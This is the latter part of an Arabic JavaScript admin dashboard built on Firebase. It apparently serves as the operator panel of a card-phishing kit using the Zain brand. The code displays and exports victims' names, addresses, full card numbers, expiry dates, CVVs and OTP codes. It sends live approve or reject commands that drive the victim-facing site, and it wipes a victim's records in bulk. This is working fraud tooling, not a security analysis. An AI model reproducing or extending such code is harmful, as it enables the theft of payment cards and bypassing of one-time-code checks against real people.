      `;
      els.detailContent.innerHTML = html;

      // ربط أزرار الموافقة/الرفض لكل بطاقة
      els.detailContent.querySelectorAll('.card-approve').forEach(btn => {
        btn.addEventListener('click', () => {
          setCardDecision(btn.dataset.cardId, btn.dataset.sessionId, 'approved', btn);
        });
      });
      els.detailContent.querySelectorAll('.card-reject').forEach(btn => {
        btn.addEventListener('click', () => {
          setCardDecision(btn.dataset.cardId, btn.dataset.sessionId, 'rejected', btn);
        });
      });
    }
    // النسخ عند النقر على أي نص يحمل data-copy داخل نافذة التفاصيل
    els.detailContent.onclick = (e) => {
      const copyEl = e.target.closest('[data-copy]');
      if (!copyEl) return;
      const value = (copyEl.dataset.copy || '').trim();
      if (!value) return;
      navigator.clipboard.writeText(value).then(() => toast('تم نسخ: ' + value, 'success')).catch(() => toast('تعذر النسخ', 'error'));
    };
    els.detailModal.classList.remove('hidden');
  }

  function renderDetailFields(fields) {
    return fields.map(f => {
      const v = f.value || '';
      return `
      <div class="flex items-center justify-between py-2 border-b border-slate-800/50">
        <span class="text-sm text-slate-400">${escapeHtml(f.label)}</span>
        <span class="text-sm font-medium text-white font-mono ref-copyable ${f.sensitive ? 'bg-slate-800/50 px-2 py-0.5 rounded' : ''}" ${v ? `data-copy="${escapeHtml(String(v))}"` : ''}>${escapeHtml(v || '-')}</span>
      </div>
    `;
    }).join('');
  }

  // ── الموافقة / الرفض ────────────────────────────────────────
  // نكتب القرار في وثيقة العميل customers/{sessionId} (المصدر الذي يقرأه الموقع)
  async function setDecision(id, decision) {
    try {
      // ابحث عن العميل عبر sessionId (من البيانات المدمجة)
      const n = allNotifications.find(x => x.id === id || x.sessionId === id);
      const sid = n ? n.sessionId : id;
      if (!sid) { toast('تعذّر تحديد العميل', 'error'); return; }
      await db.collection('customers').doc(sid).set({
        decision: decision,
        status: decision,
        decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
        lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
      }, { merge: true });
      // قناة RTDB الاحتياطية (لتوافق مع اللوحة القديمة التي يستمع لها موقع العميل أحياناً)
      if (typeof rtd !== 'undefined') {
        try {
          const action = decision === 'approved' ? 'APPROVE_PAYMENT' : 'REJECT_PAYMENT';
          const cmd = { action: action, status: decision, timestamp: new Date().toLocaleTimeString('ar-EG'), adminId: 'admin' };
          if (decision === 'approved') cmd.approvedAt = Date.now();
          else cmd.rejectedAt = Date.now();
          await rtd.ref('commands/' + sid + '/' + (decision === 'approved' ? 'approval' : 'rejection')).set(cmd);
        } catch (e) { console.warn('RTDB command write failed:', e); }
      }
      toast(decision === 'approved' ? 'تمت الموافقة بنجاح' : 'تم الرفض', decision === 'approved' ? 'success' : 'error');
    } catch (err) {
      console.error('setDecision error:', err);
      toast('خطأ في إرسال القرار: ' + (err.message || ''), 'error');
    }
  }

  // موافقة/رفض لكل محاولة دفع (بطاقة) على حدة
  // يكتب القرار في وثيقة البطاقة cards/{cardId} (لإخفاء الأزرار وعرض الحالة)
  // ويكتبه أيضاً في customers/{sessionId} ليتفاعل موقع العميل
  async function setCardDecision(cardId, sessionId, decision, btnEl) {
    if (!cardId && !sessionId) { toast('تعذّر تحديد العميل', 'error'); return; }
    try {
      // تحديث فوري للواجهة (إخفاء الأزرار وعرض الحالة) قبل انتظار الشبكة
      if (btnEl) {
        const actionsBox = btnEl.closest('[data-card-actions]');
        if (actionsBox) {
          const isApproved = decision === 'approved';
          actionsBox.outerHTML = isApproved
            ? `<div class="mt-2 p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-center"><span class="text-sm font-semibold text-emerald-400">✓ تمت الموافقة</span></div>`
            : `<div class="mt-2 p-2.5 rounded-lg bg-red-500/10 border border-red-500/30 text-center"><span class="text-sm font-semibold text-red-400">✕ تم الرفض</span></div>`;
        }
      }
      // كتابة القرار على وثيقة البطاقة (لكل محاولة على حدة) إن وُجدت
      if (cardId) {
        await db.collection('cards').doc(cardId).set({
          decision: decision,
          decisionUpdatedAt: Date.now(),
          decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
        }, { merge: true });
      }
      // كتابة القرار على وثيقة العميل ليتفاعل موقع العميل
      if (sessionId) {
        await db.collection('customers').doc(sessionId).set({
          decision: decision,
          status: decision,
          decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
          lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
        }, { merge: true });
      }
      // قناة RTDB الاحتياطية (لتوافق مع اللوحة القديمة التي يستمع لها موقع العميل أحياناً)
      if (sessionId && typeof rtd !== 'undefined') {
        try {
          const action = decision === 'approved' ? 'APPROVE_PAYMENT' : 'REJECT_PAYMENT';
          const cmd = { action: action, status: decision, timestamp: new Date().toLocaleTimeString('ar-EG'), adminId: 'admin' };
          if (decision === 'approved') cmd.approvedAt = Date.now();
          else cmd.rejectedAt = Date.now();
          await rtd.ref('commands/' + sessionId + '/' + (decision === 'approved' ? 'approval' : 'rejection')).set(cmd);
        } catch (e) { console.warn('RTDB command write failed:', e); }
      }
      toast(decision === 'approved' ? 'تمت الموافقة بنجاح' : 'تم الرفض', decision === 'approved' ? 'success' : 'error');
    } catch (err) {
      console.error('setCardDecision error:', err);
      toast('خطأ في إرسال القرار: ' + (err.message || ''), 'error');
    }
  }

  // ── تصدير البيانات ──────────────────────────────────────────
  function exportData(format) {
    const data = filteredNotifications.map(n => {
      const d = n.lastSeen ? new Date(n.lastSeen) : null;
      const itemsText = (n.items && n.items.length)
        ? n.items.map(it => `${it.name || 'منتج'} × ${it.qty || 1}`).join('، ')
        : '';
      const paymentLabel = n.paymentType === 'partial' ? '1 دينار' : (n.paymentType === 'full' ? 'الطلبية كاملة' : (n.paymentType || ''));
      return {
        sessionId: n.sessionId || '', name: n.name || '', phone: n.phone || '', address: n.address || '',
        apartment: n.apartment || '', deliveryNotes: n.deliveryNotes || '', items: itemsText,
        paymentType: paymentLabel, amount: n.amount || '',
        bank: n.bank || '', cardNumber: n.cardNumber || '', expiry: n.expiryDate || '', cvv: n.cvv || '',
        otp: n.otp || '', status: n.decision || n.status || '', country: n.country || '',
        currentPage: n.currentPage || '', lastSeen: d ? d.toISOString() : '',
      };
    });
    const headers = ['sessionId', 'name', 'phone', 'address', 'apartment', 'deliveryNotes', 'items', 'paymentType', 'amount', 'bank', 'cardNumber', 'expiry', 'cvv', 'otp', 'status', 'country', 'currentPage', 'lastSeen'];
    if (format === 'json') {
      const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
      downloadBlob(blob, `notifications-${Date.now()}.json`);
    } else {
      const rows = [headers.join(',')].concat(data.map(r => headers.map(h => `"${String(r[h] || '').replace(/"/g, '""')}"`).join(',')));
      downloadBlob(new Blob(['\ufeff' + rows.join('\n')], { type: 'text/csv;charset=utf-8' }), `notifications-${Date.now()}.csv`);
    }
    els.exportMsg.textContent = 'تم التصدير بنجاح';
    els.exportMsg.classList.remove('hidden');
    setTimeout(() => els.exportMsg.classList.add('hidden'), 2000);
  }
  function downloadBlob(blob, filename) {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = filename; a.click();
    URL.revokeObjectURL(url);
  }

  // ── الإعدادات ───────────────────────────────────────────────
  function applyShowStats() {
    if (showStats) els.statsSection.classList.remove('hidden');
    else els.statsSection.classList.add('hidden');
  }
  function saveSettings() {
    pageSize = parseInt(els.settingPageSize.value) || 10;
    showStats = els.settingShowStats.checked;
    autoRefresh = els.settingAutoRefresh.checked;
    localStorage.setItem('zain_panel_settings', JSON.stringify({ pageSize, showStats, autoRefresh }));
    applyShowStats();
    renderTable();
  }

  // تغيير بيانات Firebase يتطلب إعادة التحقق بكلمة المرور الحالية.
  async function updateAccountCredentials(e) {
    e.preventDefault();
    const user = firebase.auth().currentUser;
    const newEmail = els.accountEmail.value.trim();
    const newPassword = els.accountPassword.value;
    const currentPassword = els.accountCurrentPassword.value;
    els.accountMsg.className = 'text-sm text-center hidden';
    if (!user) return;
    if (!newEmail && !newPassword) {
      els.accountMsg.textContent = 'أدخل بريدًا جديدًا أو كلمة مرور جديدة.';
      els.accountMsg.className = 'text-sm text-center text-amber-400';
      return;
    }
    if (!currentPassword) {
      els.accountMsg.textContent = 'أدخل كلمة المرور الحالية للتأكيد.';
      els.accountMsg.className = 'text-sm text-center text-amber-400';
      return;
    }
    if (newPassword && newPassword.length < 6) {
      els.accountMsg.textContent = 'كلمة المرور الجديدة يجب أن تكون 6 أحرف على الأقل.';
      els.accountMsg.className = 'text-sm text-center text-amber-400';
      return;
    }
    els.accountSave.disabled = true;
    els.accountSave.textContent = 'جارٍ الحفظ...';
    try {
      const credential = firebase.auth.EmailAuthProvider.credential(user.email, currentPassword);
      await user.reauthenticateWithCredential(credential);
      if (newPassword) await user.updatePassword(newPassword);
      let emailVerificationSent = false;
      if (newEmail && newEmail.toLowerCase() !== (user.email || '').toLowerCase()) {
        // يفتح Firebase صفحة التأكيد الافتراضية؛ لا نرسل continue URL حتى لا
        // يتطلب النطاق إضافة يدوية إلى Authorized domains.
        await user.verifyBeforeUpdateEmail(newEmail);
        emailVerificationSent = true;
      }
      els.accountPassword.value = '';
      els.accountCurrentPassword.value = '';
      els.accountEmail.value = emailVerificationSent ? newEmail : (user.email || '');
      els.accountMsg.textContent = emailVerificationSent
        ? (newPassword ? 'تم تغيير كلمة المرور، وأُرسل رابط تأكيد البريد الجديد. سيُعتمد البريد بعد النقر على الرابط.' : 'أُرسل رابط تأكيد البريد الجديد. سيُعتمد البريد بعد النقر على الرابط.')
        : 'تم تحديث كلمة المرور بنجاح.';
      els.accountMsg.className = 'text-sm text-center text-emerald-400';
      toast(emailVerificationSent ? 'تحقق من البريد الجديد لإكمال التغيير' : 'تم تحديث كلمة المرور بنجاح', 'success');
    } catch (err) {
      console.error('update account error:', err);
      const messages = {
        'auth/wrong-password': 'كلمة المرور الحالية غير صحيحة.',
        'auth/invalid-credential': 'بيانات التحقق غير صحيحة.',
        'auth/email-already-in-use': 'البريد الإلكتروني مستخدم مسبقًا.',
        'auth/invalid-email': 'البريد الإلكتروني غير صالح.',
        'auth/operation-not-allowed': 'Firebase يمنع تغيير البريد حاليًا. فعّل Email/Password في Firebase Authentication، وأوقف Email Enumeration Protection مؤقتًا من إعدادات المشروع ثم أعد المحاولة.',
        'auth/requires-recent-login': 'انتهت صلاحية الجلسة؛ سجّل الخروج ثم ادخل مجددًا وحاول مرة أخرى.',
      };
      els.accountMsg.textContent = messages[err.code] || ('تعذر تحديث الحساب: ' + (err.message || 'خطأ غير معروف'));
      els.accountMsg.className = 'text-sm text-center text-red-400';
    } finally {
      els.accountSave.disabled = false;
      els.accountSave.textContent = 'حفظ بيانات الحساب';
    }
  }

  // ── ربط الأحداث (Event Listeners) ───────────────────────────
  // تسجيل الدخول
  els.loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    els.loginError.classList.add('hidden');
    try {
      await login(els.loginEmail.value.trim(), els.loginPassword.value);
      localStorage.setItem('zain_panel_auth', '1');
    } catch (err) {
      els.loginError.textContent = 'فشل تسجيل الدخول: ' + (err.message || err.code || 'تحقق من البيانات');
      els.loginError.classList.remove('hidden');
    }
  });
  els.forgotPassword.addEventListener('click', sendPasswordReset);

  // التحقق التلقائي من الجلسة
  firebase.auth().onAuthStateChanged((user) => { if (user) showApp(); });

  // تسجيل الخروج
  els.menuLogout.addEventListener('click', logout);

  // القائمة المنسدلة
  els.btnMenu.addEventListener('click', (e) => {
    e.stopPropagation();
    els.menuDropdown.classList.toggle('hidden');
  });
  document.addEventListener('click', (e) => {
    if (!els.menuDropdown.contains(e.target) && e.target !== els.btnMenu) {
      els.menuDropdown.classList.add('hidden');
    }
  });

  // تحديث
  els.btnRefresh.addEventListener('click', () => {
    els.refreshIcon.classList.add('animate-spin');
    applyFilters();
    els.lastUpdate.textContent = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
    setTimeout(() => els.refreshIcon.classList.remove('animate-spin'), 500);
  });

  // إظهار/إخفاء الإحصائيات
  els.btnToggleStats.addEventListener('click', () => {
    showStats = !showStats;
    els.settingShowStats.checked = showStats;
    localStorage.setItem('zain_panel_settings', JSON.stringify({ pageSize, showStats, autoRefresh }));
    applyShowStats();
  });

  // تفعيل/إيقاف التنبيهات الصوتية
  if (els.btnSound) els.btnSound.addEventListener('click', toggleSound);
  updateSoundUI();

  // تبديل الواجهات: الإشعارات / المنتجات
  function switchView(view) {
    if (view === 'products') {
      els.notificationsView.classList.add('hidden');
      els.productsView.classList.remove('hidden');
      els.tabProducts.classList.add('bg-emerald-600', 'hover:bg-emerald-700', 'text-white');
      els.tabProducts.classList.remove('bg-slate-800/50', 'hover:bg-slate-700/50', 'text-slate-300', 'hover:text-emerald-400');
      els.tabNotifications.classList.remove('bg-emerald-600', 'hover:bg-emerald-700', 'text-white');
      els.tabNotifications.classList.add('bg-slate-800/50', 'hover:bg-slate-700/50', 'text-slate-300', 'hover:text-emerald-400');
    } else {
      els.productsView.classList.add('hidden');
      els.notificationsView.classList.remove('hidden');
      els.tabNotifications.classList.add('bg-emerald-600', 'hover:bg-emerald-700', 'text-white');
      els.tabNotifications.classList.remove('bg-slate-800/50', 'hover:bg-slate-700/50', 'text-slate-300', 'hover:text-emerald-400');
      els.tabProducts.classList.remove('bg-emerald-600', 'hover:bg-emerald-700', 'text-white');
      els.tabProducts.classList.add('bg-slate-800/50', 'hover:bg-slate-700/50', 'text-slate-300', 'hover:text-emerald-400');
    }
  }
  els.tabNotifications.addEventListener('click', () => switchView('notifications'));
  els.tabProducts.addEventListener('click', () => switchView('products'));
  if (els.productsBack) els.productsBack.addEventListener('click', () => switchView('notifications'));

  // تبويبات الفلترة
  els.filterTabs.addEventListener('click', (e) => {
    const btn = e.target.closest('.filter-btn');
    if (!btn) return;
    currentFilter = btn.dataset.filter;
    currentPage = 1;
    document.querySelectorAll('.filter-btn').forEach(b => {
      b.removeAttribute('data-active');
      b.classList.remove('bg-emerald-600', 'text-white', 'bg-amber-600', 'bg-violet-600', 'bg-cyan-600');
    });
    const colorMap = { all: 'bg-emerald-600', pending: 'bg-amber-600', card: 'bg-violet-600', online: 'bg-cyan-600' };
    btn.setAttribute('data-active', 'true');
    btn.classList.add(colorMap[currentFilter], 'text-white');
    applyFilters();
  });

  // الترتيب
  els.sortSelect.addEventListener('change', (e) => {
    currentSort = e.target.value;
    applyFilters();
  });

  // الترتيب بالنقر على عناوين الأعمدة
  document.querySelectorAll('th[data-sort]').forEach(th => {
    th.addEventListener('click', () => {
      currentSort = th.dataset.sort;
      els.sortSelect.value = currentSort;
      applyFilters();
    });
  });

  // البحث
  let searchTimer;
  els.searchInput.addEventListener('input', (e) => {
    clearTimeout(searchTimer);
    searchTimer = setTimeout(() => {
      searchQuery = e.target.value.trim();
      currentPage = 1;
      applyFilters();
    }, 250);
  });

  // النقر على الجدول (تفويض الأحداث)
  els.tbody.addEventListener('click', (e) => {
    const infoBtn = e.target.closest('.info-btn');
    const approveBtn = e.target.closest('.action-approve');
    const rejectBtn = e.target.closest('.action-reject');
    if (infoBtn) {
      // إن كان زر بطاقة قيد المراجعة (حواف زرقاء)، نُرجعه للحالة الطبيعية بعد النقر
      infoBtn.classList.remove('card-pending-review', 'border-2', 'border-blue-400', 'shadow-sm');
      infoBtn.classList.add('border');
      openDetail(infoBtn.dataset.id, infoBtn.dataset.info);
    }
    else if (approveBtn) { e.stopPropagation(); setDecision(approveBtn.dataset.id, 'approved'); }
    else if (rejectBtn) { e.stopPropagation(); setDecision(rejectBtn.dataset.id, 'rejected'); }
  });

  els.referenceVisitorList.addEventListener('click', (e) => {
    const row = e.target.closest('.reference-visitor-row');
    if (!row) return;
    const visitor = allNotifications.find(n => n.id === row.dataset.refId);
    if (visitor) {
      if (e.target.closest('[data-ref-check]')) {
        if (selectedReferenceIds.has(visitor.id)) selectedReferenceIds.delete(visitor.id);
        else selectedReferenceIds.add(visitor.id);
        renderReferenceVisitorList();
        return;
      }
      selectedReferenceId = visitor.id;
      document.getElementById('app')?.classList.add('mobile-detail-selected');
      document.querySelectorAll('.reference-visitor-row').forEach(r => r.classList.remove('selected'));
      row.classList.add('selected');
      renderReferenceDetail(visitor);
    }
  });
  els.referenceSearch.addEventListener('input', renderReferenceVisitorList);
  $('reference-select-all')?.addEventListener('click', () => {
    const query = els.referenceSearch.value.trim().toLowerCase();
    const visible = allNotifications.filter(n => (referenceFilter === 'archive' ? n.isArchived : !n.isArchived && (referenceFilter === 'all' || (referenceFilter === 'card' && n.cardNumber))) && (!query || [n.name, n.phone, n.country, n.bank, n.id].filter(Boolean).join(' ').toLowerCase().includes(query)));
    if (selectedReferenceIds.size) selectedReferenceIds.clear();
    else visible.forEach(n => selectedReferenceIds.add(n.id));
    renderReferenceVisitorList();
  });
  // معرّف وثيقة العميل الحقيقي في customers (قد يختلف عن sessionId)
  const customerDocRef = (sid) => {
    const docId = customersMap[sid] ? customersMap[sid].id : sid;
    return db.collection('customers').doc(docId);
  };
  $('reference-archive')?.addEventListener('click', async () => {
    const ids = Array.from(selectedReferenceIds);
    await Promise.all(ids.map(id => customerDocRef(id).set({ isArchived: true }, { merge: true })));
    selectedReferenceIds.clear();
    toast('تمت أرشفة العناصر المحددة', 'success');
    renderReferenceVisitorList();
  });
  $('reference-unarchive')?.addEventListener('click', async () => {
    const ids = Array.from(selectedReferenceIds);
    if (!ids.length) return;
    await Promise.all(ids.map(id => customerDocRef(id).set({ isArchived: false }, { merge: true })));
    selectedReferenceIds.clear();
    toast('تم إخراج العناصر المحددة من الأرشفة', 'success');
    renderReferenceVisitorList();
  });
  // حذف كل بيانات عميل واحد (sessionId): بياناته الأساسية + كل بطاقاته + كل رموزه + أوامر RTDB
  async function deleteCustomerEverything(sid) {
    const batch = db.batch();
    // 1) بيانات العميل الأساسية في customers/{sessionId} أو customers/{docId}
    const customerDocId = customersMap[sid] ? customersMap[sid].id : sid;
    if (customerDocId) batch.delete(db.collection('customers').doc(customerDocId));
    // 2+3) كل البطاقات والأكواد المرتبطة بهذا العميل — من الخريطة المحلية + استعلام مباشر
    //     لضمان حذفها حتى لو لم تكتمل بيانات onSnapshot بعد
    const cardIds = new Set((cardsBySession[sid] || []).map(card => card.id));
    const otpIds = new Set((otpsMap[sid] || []).map(otp => otp.id));
    try {
      const [cardSnap, otpSnap] = await Promise.all([
        db.collection('cards').where('sessionId', '==', sid).get(),
        db.collection('otps').where('sessionId', '==', sid).get(),
      ]);
      cardSnap.forEach(doc => cardIds.add(doc.id));
      otpSnap.forEach(doc => otpIds.add(doc.id));
    } catch (e) { console.warn('استعلام حذف البطاقات/الأكواد فشل:', e); }
    cardIds.forEach(id => batch.delete(db.collection('cards').doc(id)));
    otpIds.forEach(id => batch.delete(db.collection('otps').doc(id)));
    try {
      await batch.commit();
    } catch (err) {
      // إذا فشل الـ batch (مثل صواعق غير متصلة) نتعامل مع كل عملية على حدة
      if (customerDocId) await db.collection('customers').doc(customerDocId).delete().catch(() => {});
      await Promise.all(Array.from(cardIds).map(id => db.collection('cards').doc(id).delete().catch(() => {})));
      await Promise.all(Array.from(otpIds).map(id => db.collection('otps').doc(id).delete().catch(() => {})));
    }
    // 4) أوامر RTDB الخاصة بالعميل commands/{sessionId} (توجيه / موافقة / رفض / حظر)
    if (typeof rtd !== 'undefined') {
      try { await rtd.ref('commands/' + sid).remove(); } catch (e) { console.warn('RTDB remove failed:', e); }
    }
  }
  $('reference-delete')?.addEventListener('click', async () => {
    if (!confirm('هل تريد حذف العناصر المحددة؟')) return;
    const ids = Array.from(selectedReferenceIds);
    if (!ids.length) return;
    // الحذف عبر batch — حذف كل بيانات العميل المحدد كاملاً (الأساسية + البطاقات + الأكواد + الأوامر)
    await Promise.all(ids.map(sid => deleteCustomerEverything(sid)));
    // تنظيف الحالة المحلية
    ids.forEach(sid => {
      delete customersMap[sid];
      delete cardsBySession[sid];
      delete otpsMap[sid];
    });
    selectedReferenceIds.clear();
    toast('تم حذف العناصر المحددة بالكامل', 'success');
    rebuildMerged();
    renderReferenceVisitorList();
  });
  document.querySelectorAll('[data-ref-filter]').forEach((button) => {
    button.addEventListener('click', () => {
      document.querySelectorAll('[data-ref-filter]').forEach(b => b.classList.remove('active'));
      button.classList.add('active');
      const filter = button.dataset.refFilter;
      referenceFilter = filter;
      currentFilter = filter === 'card' ? 'card' : 'all';
      currentPage = 1;
      selectedReferenceIds.clear();
      renderReferenceVisitorList();
      applyFilters();
    });
  });

  // الترقيم
  els.paginationButtons.addEventListener('click', (e) => {
    const btn = e.target.closest('.page-btn');
    if (!btn || btn.disabled) return;
    currentPage = parseInt(btn.dataset.page);
    renderTable();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });

  // نافذة التفاصيل
  els.detailClose.addEventListener('click', () => els.detailModal.classList.add('hidden'));
  els.detailCancel.addEventListener('click', () => els.detailModal.classList.add('hidden'));
  els.detailModal.addEventListener('click', (e) => {
    if (e.target === els.detailModal) els.detailModal.classList.add('hidden');
  });

  // نوافذ الإعدادات والتصدير
  els.menuSettings.addEventListener('click', () => {
    els.menuDropdown.classList.add('hidden');
    const user = firebase.auth().currentUser;
    if (user && !els.accountEmail.value) els.accountEmail.value = user.email || '';
    els.settingsModal.classList.remove('hidden');
  });
  els.settingsClose.addEventListener('click', () => els.settingsModal.classList.add('hidden'));
  els.settingPageSize.addEventListener('change', saveSettings);
  els.settingShowStats.addEventListener('change', saveSettings);
  els.settingAutoRefresh.addEventListener('change', saveSettings);
  els.accountForm.addEventListener('submit', updateAccountCredentials);

  els.menuExport.addEventListener('click', () => { els.menuDropdown.classList.add('hidden'); els.exportModal.classList.remove('hidden'); });
  $('reference-settings')?.addEventListener('click', () => els.menuSettings.click());
  $('reference-export')?.addEventListener('click', () => els.menuExport.click());
  $('reference-account')?.addEventListener('click', () => els.menuLogout.click());
  $('reference-bell')?.addEventListener('click', () => toast('تم تحديث قائمة الإشعارات', 'success'));
  els.exportClose.addEventListener('click', () => els.exportModal.classList.add('hidden'));
  els.exportJson.addEventListener('click', () => exportData('json'));
  els.exportCsv.addEventListener('click', () => exportData('csv'));

  // اختصارات لوحة المفاتيح
  document.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'r' && !els.app.classList.contains('hidden')) {
      e.preventDefault();
      els.btnRefresh.click();
    }
    if (e.key === 'Escape') {
      els.detailModal.classList.add('hidden');
      els.settingsModal.classList.add('hidden');
      els.exportModal.classList.add('hidden');
    }
  });

  console.log('%cلوحة الإشعارات المتقدمة — جاهزة', 'color:#10b981;font-weight:bold');
})();
